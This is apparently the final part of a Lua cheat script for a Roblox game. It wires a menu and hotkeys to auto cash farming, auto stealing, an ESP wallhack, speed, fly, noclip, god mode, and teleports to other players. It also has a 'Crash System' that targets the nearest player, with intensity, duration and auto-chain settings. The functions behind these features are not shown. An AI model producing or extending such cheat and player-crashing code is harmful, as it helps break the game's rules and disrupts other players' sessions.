    Config.AntiAFK = v; ToggleAntiAFK(v); SaveConfig()
end, "AntiAFK")
GUI:CreateSection(TabMain, "Farm")
GUI:CreateToggle(TabMain, "Auto Cash Farm", Config.InfiniteMoney, function(v)
    Config.InfiniteMoney = v; ToggleInfiniteMoney(v); SaveConfig()
    if GUIToggles.InfiniteMoney then GUIToggles.InfiniteMoney:Set(v) end
end)

local TabSteal = GUI:CreateTab("Steal", "*")
GUI:CreateSection(TabSteal, "Steal")
GUI:CreateButton(TabSteal, "Instant Grab  (E)", PerformInstantSteal)
GUI:CreateToggle(TabSteal, "Auto Steal Loop", Config.AutoSteal, function(v)
    Config.AutoSteal = v; ToggleAutoSteal(v); SaveConfig()
end, "AutoSteal")
GUI:CreateButton(TabSteal, "TP to Best Brainrot", TeleportToBestBrainrot)
GUI:CreateSection(TabSteal, "Base")
GUI:CreateButton(TabSteal, "TP to Own Base  (Q)", function() TeleportToBase(LP) end)

local TabESP = GUI:CreateTab("ESP", "+")
GUI:CreateSection(TabESP, "Players & Items")
GUI:CreateToggle(TabESP, "ESP / Wallhack", Config.ESPEnabled, function(v)
    Config.ESPEnabled = v; ScanESP(); SaveConfig()
end, "ESPEnabled")
GUI:CreateButton(TabESP, "Refresh ESP Scan", function()
    ScanESP(); Notifications:Notify("ESP refreshed", 1, Color3.fromRGB(124, 58, 237))
end)
GUI:CreateSection(TabESP, "Visuals")
GUI:CreateToggle(TabESP, "Trail Effects", Config.TrailsEnabled, function(v)
    Config.TrailsEnabled = v; ToggleTrails(v); SaveConfig()
end)
GUI:CreateToggle(TabESP, "Custom Crosshair", Config.CrosshairEnabled, function(v)
    Config.CrosshairEnabled = v; ToggleCrosshair(v); SaveConfig()
end)
GUI:CreateToggle(TabESP, "Full Bright", Config.FullBright, function(v)
    Config.FullBright = v; ToggleFullBright(v); SaveConfig()
end)
GUI:CreateToggle(TabESP, "No Fog", Config.NoFog, function(v)
    Config.NoFog = v; ToggleNoFog(v); SaveConfig()
end)

local TabMove = GUI:CreateTab("Character", "/")
GUI:CreateSection(TabMove, "Movement")
GUI:CreateToggle(TabMove, "Speed Hack  (X)", Config.SpeedEnabled, function(v)
    Config.SpeedEnabled = v; ToggleSpeed(v); SaveConfig()
end, "SpeedEnabled")
GUI:CreateSlider(TabMove, "Walk Speed", 16, 200, Config.SpeedValue, function(v)
    Config.SpeedValue = v; SaveConfig()
    if Config.SpeedEnabled then local h = GetHumanoid(); if h then h.WalkSpeed = v end end
end)
GUI:CreateToggle(TabMove, "Fly  (F)", Config.FlyMode, function(v)
    Config.FlyMode = v; ToggleFly(v); SaveConfig()
end, "FlyMode")
GUI:CreateSlider(TabMove, "Fly Speed", 10, 200, Config.FlySpeed, function(v)
    Config.FlySpeed = v; SaveConfig()
end)
GUI:CreateToggle(TabMove, "Noclip  (N)", Config.NoclipEnabled, function(v)
    Config.NoclipEnabled = v; ToggleNoclip(v); SaveConfig()
end, "NoclipEnabled")
GUI:CreateToggle(TabMove, "Infinite Jump", Config.InfiniteJump, function(v)
    Config.InfiniteJump = v; ToggleInfiniteJump(v); SaveConfig()
end, "InfiniteJump")
GUI:CreateToggle(TabMove, "Float", Config.FloatMode, function(v)
    Config.FloatMode = v; ToggleFloat(v); SaveConfig()
end, "FloatMode")
GUI:CreateSlider(TabMove, "Jump Power", 50, 200, Config.JumpPower or 100, function(v)
    Config.JumpPower = v
    local h = GetHumanoid(); if h then h.JumpPower = v end
    SaveConfig()
end)

local TabTP = GUI:CreateTab("World", "@")
GUI:CreateSection(TabTP, "Teleport")
GUI:CreateButton(TabTP, "TP Nearest Player  (P)", function()
    local n = GetNearestPlayer()
    if n then TeleportToPlayer(n) else Notifications:Notify("No players nearby", 2, Color3.fromRGB(255, 100, 0)) end
end)
GUI:CreateButton(TabTP, "TP to Best Brainrot", TeleportToBestBrainrot)
GUI:CreateButton(TabTP, "TP to Own Base", function() TeleportToBase(LP) end)
GUI:CreateSection(TabTP, "Players")

local TabSettings = GUI:CreateTab("Settings", "#")
GUI:CreateSection(TabSettings, "Interface")
GUI:CreateToggle(TabSettings, "Hide UI On Load", Config.HideUIOnLoad, function(v)
    Config.HideUIOnLoad = v; SaveConfig()
end)
GUI:CreateButton(TabSettings, "Toggle Menu  (Right Shift)", GUI.ToggleVisible)
GUI:CreateSection(TabSettings, "Config")
GUI:CreateButton(TabSettings, "Save Config", function()
    SaveConfig(); Notifications:Notify("Config saved", 2, Color3.fromRGB(0, 255, 100))
end)
GUI:CreateButton(TabSettings, "Rejoin Server", function()
    Services.TeleportService:Teleport(game.PlaceId, LP)
end)
GUI:CreateButton(TabSettings, "Reset Character", function()
    local h = GetHumanoid(); if h then h.Health = 0 end
end)
GUI:CreateSection(TabSettings, "Advanced")
GUI:CreateToggle(TabSettings, "Crash System", Config.CrashEnabled, function(v)
    ToggleCrashSystem(v)
end)
GUI:CreateSlider(TabSettings, "Crash Intensity", 0.1, 2.0, Config.CrashIntensity, function(v)
    CrashState.Intensity = v; Config.CrashIntensity = v; SaveConfig()
end)
GUI:CreateSlider(TabSettings, "Crash Duration", 1, 15, Config.CrashDuration, function(v)
    CrashState.Duration = v; Config.CrashDuration = v; SaveConfig()
end)
GUI:CreateToggle(TabSettings, "Auto Chain Crash", Config.CrashAutoRefresh, function(v)
    CrashState.AutoRefresh = v; Config.CrashAutoRefresh = v; SaveConfig()
end)
GUI:CreateButton(TabSettings, "Crash Nearest  (K)", CrashNearestPlayer)
GUI:CreateButton(TabSettings, "Stop Crash  (L)", StopCrash)

local function RefreshPlayerList()
    for _, child in ipairs(TabTP.Frame:GetChildren()) do
        if child:IsA("TextButton") and child.Text:find("TP â€º") then
            child:Destroy()
        end
    end
    for _, player in ipairs(Services.Players:GetPlayers()) do
        if player ~= LP then
            GUI:CreateButton(TabTP, "TP â€º " .. player.Name, function()
                TeleportToPlayer(player)
            end)
        end
    end
end
RefreshPlayerList()
Services.Players.PlayerAdded:Connect(RefreshPlayerList)
Services.Players.PlayerRemoving:Connect(RefreshPlayerList)

-- ============================================================
-- KEYBOARD BINDINGS
-- ============================================================
Services.UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.RightShift then
        GUI.ToggleVisible()
        Notifications:Notify("GUI " .. (GUI.MainFrame.Visible and "shown" or "hidden"), 1.5, Color3.fromRGB(124, 58, 237))
        return
    end

    if gameProcessed then return end

    if input.KeyCode == Enum.KeyCode.X then
        Config.SpeedEnabled = not Config.SpeedEnabled
        ToggleSpeed(Config.SpeedEnabled)
        SaveConfig()
        if GUIToggles.SpeedEnabled then GUIToggles.SpeedEnabled:Set(Config.SpeedEnabled) end
        Notifications:Notify("Speed " .. (Config.SpeedEnabled and "ON" or "OFF"), 1.5, Color3.fromRGB(124, 58, 237))

    elseif input.KeyCode == Enum.KeyCode.G then
        Config.GodMode = not Config.GodMode
        ToggleGodMode(Config.GodMode)
        SaveConfig()
        if GUIToggles.GodMode then GUIToggles.GodMode:Set(Config.GodMode) end
        Notifications:Notify("God Mode " .. (Config.GodMode and "ON" or "OFF"), 1.5, Color3.fromRGB(255, 200, 0))

    elseif input.KeyCode == Enum.KeyCode.F then
        Config.FlyMode = not Config.FlyMode
        ToggleFly(Config.FlyMode)
        SaveConfig()
        if GUIToggles.FlyMode then GUIToggles.FlyMode:Set(Config.FlyMode) end
        Notifications:Notify("Fly " .. (Config.FlyMode and "ON" or "OFF"), 1.5, Color3.fromRGB(124, 58, 237))

    elseif input.KeyCode == Enum.KeyCode.N then
        Config.NoclipEnabled = not Config.NoclipEnabled
        ToggleNoclip(Config.NoclipEnabled)
        SaveConfig()
        if GUIToggles.NoclipEnabled then GUIToggles.NoclipEnabled:Set(Config.NoclipEnabled) end
        Notifications:Notify("Noclip " .. (Config.NoclipEnabled and "ON" or "OFF"), 1.5, Color3.fromRGB(124, 58, 237))

    elseif input.KeyCode == Enum.KeyCode.Z then
        Config.ESPEnabled = not Config.ESPEnabled
        ScanESP()
        SaveConfig()
        if GUIToggles.ESPEnabled then GUIToggles.ESPEnabled:Set(Config.ESPEnabled) end
        Notifications:Notify("ESP " .. (Config.ESPEnabled and "ON" or "OFF"), 1.5, Color3.fromRGB(124, 58, 237))

    elseif input.KeyCode == Enum.KeyCode.E then
        PerformInstantSteal()

    elseif input.KeyCode == Enum.KeyCode.Q then
        TeleportToBase(LP)

    elseif input.KeyCode == Enum.KeyCode.P then
        local nearest = GetNearestPlayer()
        if nearest then
            TeleportToPlayer(nearest)
        else
            Notifications:Notify("No players nearby", 1.5, Color3.fromRGB(255, 100, 0))
        end

    elseif input.KeyCode == Enum.KeyCode.K then
        if CrashState.Enabled then
            CrashNearestPlayer()
        else
            Notifications:Notify("Enable Crash system first (Crash tab)", 2, Color3.fromRGB(255, 100, 0))
        end

    elseif input.KeyCode == Enum.KeyCode.L then
        StopCrash()
    end
end)

-- ============================================================
-- STARTUP LOGIC
-- ============================================================
local function OnStartup()
    WaitForCharacter()
    task.wait(0.5)

    GUI.MainFrame.Visible = not Config.HideUIOnLoad
    Notifications:Notify("Unnamed Enhancements loaded | Right Shift = menu", 3, Color3.fromRGB(124, 58, 237))

    -- Apply saved toggles once character is ready
    if Config.InfiniteMoney then SafeCall("InfiniteMoney", ToggleInfiniteMoney, true) end
    if Config.SpeedEnabled then SafeCall("Speed", ToggleSpeed, true) end
    if Config.GodMode then SafeCall("GodMode", ToggleGodMode, true) end
    if Config.FlyMode then SafeCall("Fly", ToggleFly, true) end
    if Config.NoclipEnabled then SafeCall("Noclip", ToggleNoclip, true) end
    if Config.AutoComplete then SafeCall("AutoComplete", ToggleAutoComplete, true) end
    if Config.AutoSteal then SafeCall("AutoSteal", ToggleAutoSteal, true) end
    if Config.ESPEnabled then SafeCall("ESP", ScanESP) end
    if Config.InfiniteJump then SafeCall("InfiniteJump", ToggleInfiniteJump, true) end
    if Config.AntiAFK then SafeCall("AntiAFK", ToggleAntiAFK, true) end
    if Config.FloatMode then SafeCall("Float", ToggleFloat, true) end
    if Config.FullBright then SafeCall("FullBright", ToggleFullBright, true) end
    if Config.NoFog then SafeCall("NoFog", ToggleNoFog, true) end
    if Config.TrailsEnabled then SafeCall("Trails", ToggleTrails, true) end
    if Config.CrosshairEnabled then SafeCall("Crosshair", ToggleCrosshair, true) end

    local humanoid = GetHumanoid()
    if humanoid and Config.JumpPower then
        humanoid.JumpPower = Config.JumpPower
    end

    Notifications:Notify("All saved states restored", 2, Color3.fromRGB(0, 255, 100))
end

task.spawn(function()
    local ok, err = pcall(OnStartup)
    if not ok then
        DebugWarn("Startup", err)
        Notifications:Notify("Startup failed: " .. tostring(err), 5, Color3.fromRGB(255, 50, 50))
    end
end)

-- ============================================================
-- ANTI-CRASH CLEANUP ON GUI CLOSE
-- ============================================================
LP.OnTeleport:Connect(function()
    -- Clean up crash state before teleport
    CrashState.Active = false
end)

-- Ensure GUI reference doesn't get garbage collected
return GUI
